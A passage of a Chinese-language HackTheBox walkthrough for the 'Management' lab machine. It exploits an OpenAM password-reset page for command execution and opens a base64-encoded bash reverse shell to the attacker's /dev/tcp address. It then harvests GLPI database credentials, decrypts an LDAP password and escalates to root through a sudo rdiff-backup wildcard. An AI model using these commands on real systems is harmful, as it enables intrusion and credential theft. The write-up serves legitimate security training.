+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 CVE-2026-33439.py --url https://sso.management.htb/openam/ui/PWResetUserValidation <span class="s1">&#39;id&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP <span class="m">200</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>996<span class="o">(</span>openam<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>987<span class="o">(</span>openam<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>987<span class="o">(</span>openam<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功执行命令，漏洞发生在 <code>openam/ui/PWResetUserValidation</code> 密码重置页面。</p>
+<p>本机开启端口监听，准备接收反弹 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>                                                   
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>让靶机执行反弹 Shell 命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> -n <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.17.69/1234 0&gt;&amp;1&#34;</span> <span class="p">|</span> base64
+</span></span><span class="line"><span class="cl">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy42OS8xMjM0IDA+JjE<span class="o">=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 CVE-2026-33439.py --url https://sso.management.htb/openam/ui/PWResetUserValidation <span class="s1">&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy42OS8xMjM0IDA+JjE=|base64 -d|bash&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功接收反弹 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1234</span>                                                   
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.17.69<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.77.52<span class="o">]</span> <span class="m">59046</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1691<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">openam@management:/$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>996<span class="o">(</span>openam<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>987<span class="o">(</span>openam<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>987<span class="o">(</span>openam<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>这里为什么要 Base64 编码后传反弹 Shell 命令呢？</p>
+<p>原本我输入的是：bash -i &gt;&amp; /dev/tcp/10.10.17.69/1234 0&gt;&amp;1</p>
+<p>但是回显报错：/bin/sh: 1: Syntax error: Bad fd number</p>
+<p>因为 bash 的 <code>&gt;&amp;</code> 这种交互式重定向语法不能直接丢给 sh 执行，所以我们编码后再执行。</p>
+</blockquote>
+<p>稳定 Shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;);&#34;</span>
+</span></span><span class="line"><span class="cl">Ctrl + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="横向移动">横向移动
+</h2><p>通过 <code>/etc/passwd</code> 查看用户信息。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openam@management:/$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">pollinate:x:102:1::/var/cache/pollinate:/bin/false
+</span></span><span class="line"><span class="cl">polkitd:x:991:991:User <span class="k">for</span> polkitd:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">syslog:x:103:104::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span class="line"><span class="cl">landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_laurel:x:999:988::/var/log/laurel:/bin/false
+</span></span><span class="line"><span class="cl">owen:x:1000:1000:Owen Castellan:/home/owen:/bin/bash
+</span></span><span class="line"><span class="cl">openam:x:996:987::/opt/openam:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mysql:x:110:111:MariaDB Server,,,:/nonexistent:/bin/false
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以发现除 <code>root</code> 之外，还存在一个用户 <code>owen</code>，而我们当前用户 <code>openam</code> 的家目录位于 <code>/opt/openam</code>。同时我们注意到还有 <code>mysql</code>，数据库里一般会有一些敏感信息。</p>
+<p><code>/opt</code> 目录一般就是用来放独立第三方应用的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openam@management:/$ ls -la /opt
+</span></span><span class="line"><span class="cl">total <span class="m">36</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">9</span> root     root     <span class="m">4096</span> Sep  <span class="m">7</span> 11:41 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">23</span> root     root     <span class="m">4096</span> Sep  <span class="m">7</span> 11:41 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">4</span> www-data www-data <span class="m">4096</span> Sep  <span class="m">7</span> 11:41 backup
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root     root     <span class="m">4096</span> Sep  <span class="m">7</span> 11:41 backups
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">22</span> www-data www-data <span class="m">4096</span> Sep  <span class="m">7</span> 11:41 glpi
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">3</span> openam   openam   <span class="m">4096</span> Sep  <span class="m">7</span> 11:41 openam
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">9</span> openam   openam   <span class="m">4096</span> Sep  <span class="m">7</span> 11:41 openam-tomcat
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">5</span> root     root     <span class="m">4096</span> Sep  <span class="m">7</span> 11:41 sysinternalsEBPF
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root     root     <span class="m">4096</span> Nov <span class="m">16</span> 03:40 sysmon
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此处还发现 <code>/glpi</code> 目录，这是一个开源的 PHP 写的 IT 资产管理 + 服务台工单系统。</p>
+<p>查看其配置文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openam@management:/opt/glpi/config$ cat config_db.php 
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class DB extends DBmysql <span class="o">{</span>
+</span></span><span class="line"><span class="cl">   public <span class="nv">$dbhost</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   public <span class="nv">$dbuser</span> <span class="o">=</span> <span class="s1">&#39;glpi&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   public <span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s1">&#39;8rhu0L6Pw4Y7&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   public <span class="nv">$dbdefault</span> <span class="o">=</span> <span class="s1">&#39;glpidb&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   public <span class="nv">$use_utf8mb4</span> <span class="o">=</span> true<span class="p">;</span>
+</span></span><span class="line"><span class="cl">   public <span class="nv">$allow_datetime</span> <span class="o">=</span> false<span class="p">;</span>
+</span></span><span class="line"><span class="cl">   public <span class="nv">$allow_signed_keys</span> <span class="o">=</span> false<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>泄露了硬编码的账号密码，用来登录 Mysql。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openam@management:/opt/glpi/config$ mysql -u glpi -p<span class="s1">&#39;8rhu0L6Pw4Y7&#39;</span> -h 127.0.0.1
+</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span></span><span class="line"><span class="cl">Your MariaDB connection id is <span class="m">32</span>
+</span></span><span class="line"><span class="cl">Server version: 10.11.14-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; show databases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> glpidb             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span>0.002 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; use glpidb<span class="p">;</span>
+</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database changed
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>glpidb<span class="o">]</span>&gt; show tables<span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里有巨量的数据表，比较敏感的是 <code>glpi_authldaps</code> ，存储 GLPI 对接 LDAP 的连接配置。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">select</span> * from glpi_authldaps<span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/21.-management/assets/image-20261116144058387.png"
+	width="2231"
+	height="930"
+	srcset="/p/21.-management/assets/image-20261116144058387_hu5372833816503660848.png 480w, /p/21.-management/assets/image-20261116144058387_hu12432946364737956439.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261116144058387"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="575px"
+	
+></p>
+<p><code>rootdn</code> 是用来登录 LDAP 服务器的账号的完整 DN。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">name</span> <span class="o">=</span> Management Directory
+</span></span><span class="line"><span class="cl"><span class="nv">rootdn</span> <span class="o">=</span> <span class="nv">cn</span><span class="o">=</span>svc-glpi,ou<span class="o">=</span>services,dc<span class="o">=</span>management,dc<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl"><span class="nv">rootdn_passwd</span> <span class="o">=</span> avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw<span class="o">==</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>密码是经过加密的，GLPI 10.x 使用 libsodium 的 XChaCha20-Poly1305（一种现代认证加密算法）对这类密钥进行加密。加密后的数据块结构如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span> 24-byte nonce <span class="o">]</span> + <span class="o">[</span> ciphertext + authentication tag <span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>nonce 是每次加密时使用一次的随机值（不是秘密的，与数据一起存储）。</li>
+<li>用于加密/解密的实际密钥单独存储，位于：<code>/opt/glpi/config/glpicrypt.key</code></li>
+</ul>
+<p>而这种加密是可逆的，所以要解密：将 blob 分成 nonce + 密文，然后使用密钥运行 libsodium 的解密函数。</p>
+<p>解密脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php -r <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">\$key = file_get_contents(&#39;/opt/glpi/config/glpicrypt.key&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">\$ciphertext = base64_decode(&#39;avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">\$nonce = substr(\$ciphertext, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
+</span></span></span><span class="line"><span class="cl"><span class="s2">\$data  = substr(\$ciphertext, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
+</span></span></span><span class="line"><span class="cl"><span class="s2">\$plain = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(\$data, \$nonce, \$nonce, \$key);
+</span></span></span><span class="line"><span class="cl"><span class="s2">echo \$plain . PHP_EOL;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密得到 <code>WpczC40GhTbk</code>。</p>
+<p>使用这个密码登录 <code>owen</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh owen@10.129.77.52               
+</span></span><span class="line"><span class="cl">owen@10.129.77.52<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Mon Nov <span class="m">16</span> 06:50:37 <span class="m">2026</span> from 10.10.17.69
+</span></span><span class="line"><span class="cl">owen@management:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">551419414743b652c115b0d75d969379
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 user flag：<code>551419414743b652c115b0d75d969379</code></p>
+<h2 id="提权">提权
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">owen@management:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> owen on management:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
+</span></span><span class="line"><span class="cl">    use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User owen may run the following commands on management:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
+</span></span><span class="line"><span class="cl">        --restrict-mode read-only *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>rdiff-backup</code> 是增量备份工具，<code>--server</code> 以服务端模式运行，<code>--restrict-path /opt/backup</code> 强制限定 rdiff-backup 只能访问这个目录，<code>--restrict-mode read-only</code> 客户端只能读取里面的文件；<code>*</code> 占位参数。</p>
+<p>存在危险的就是最后的 <code>*</code> 参数。因为这允许我们在命令的固定部分之后添加任何额外参数。</p>
+<p><code>rdiff-backup</code> 从左到右解析参数，如果同一个选项给出了两次，则最后一个选项生效。</p>
+<p>所以，如果我们能输入<code>--restrict-path /</code>，它将完全覆盖原始的 <code>/opt/backup</code> 限制，从而使 root 拥有的 <code>rdiff-backup --server</code> 进程能够访问整个文件系统。</p>
+<p>但是我们不能在原本的命令后面直接插入 <code>--restrict-path /</code>，因为这是固定命令，我们客户端传的参数会被丢弃。</p>
+<p>诀窍在于 rdiff-backup 自身的 <code>--remote-schema</code> 选项，该选项允许客户端自定义用于生成服务器进程的命令，使用 <code>%s</code> 作为目标位置主机名部分的占位符。</p>
+<p><code>rdiff-backup</code> 将位置信息解析为 <code>hostname::path</code> 格式。因此，位置信息如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/::/root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解析结果为<code> hostname = /</code> 和 <code>path = /root</code>。当客户端构建服务器命令时，它会将 %s 替换为该主机名（即 /）。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rdiff-backup <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --remote-schema <span class="s2">&#34;sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  backup /::/root /tmp/root_backup
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">owen@management:~$ ls -l /tmp/root_backup/
+</span></span><span class="line"><span class="cl">total <span class="m">8</span>
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> owen owen <span class="m">4096</span> Nov <span class="m">16</span> 07:05 rdiff-backup-data
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> owen owen   <span class="m">33</span> Nov <span class="m">16</span> 03:40 root.txt
+</span></span><span class="line"><span class="cl">owen@management:~$ cat /tmp/root_backup/root.txt 
+</span></span><span class="line"><span class="cl">149bf8f7d779820f007341ece21091e3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 root flag ：<code>149bf8f7d779820f007341ece21091e3</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
